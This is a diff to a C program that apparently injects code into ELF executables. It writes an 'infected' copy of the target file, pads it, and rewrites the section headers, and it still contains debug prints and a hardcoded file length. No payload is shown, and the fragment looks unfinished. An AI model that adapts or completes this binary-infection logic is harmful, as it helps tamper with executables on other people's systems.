@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/stat.h>
 
 //used for memcpy
 #include <string.h>
@@ -42,6 +43,8 @@ int main(int argc, char * argv[]){
 	int text_segment_index;
 	unsigned int new_code_address;
 
+	struct stat stat;
+	
 	//open file to be injected for manipulation
 	if((fp = fopen(argv[1],"r")) == NULL)
 		goto file_to_inject_open_error;	
@@ -169,11 +172,31 @@ int main(int argc, char * argv[]){
 	for(int i=0;i<garbage_size;i++){
 		garbage[i] = 'B';
 	}
+	
 
+	//write the garbage to the file
 	write(infected_descriptor, garbage, garbage_size);
+	
+	//write everything up to section header to file
+	
+	puts("here?");
+	copy_partial(fd, infected_descriptor, elf_header->e_shentsize*elf_header->e_shnum);
 
+	//write the section headers to the file
+	for(int i=0;i<elf_header->e_shnum; i++){
+		write(infected_descriptor, section_headers[i], elf_header->e_shentsize);
+	}
 	
+	if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
+		puts("LSEEK ERROR");
+	}
+
+
+	//write everything to end of file	
+	puts("or here?");
+	copy_partial(fd, infected_descriptor,7556-position);
 	
+
 	return 0;
 	
 
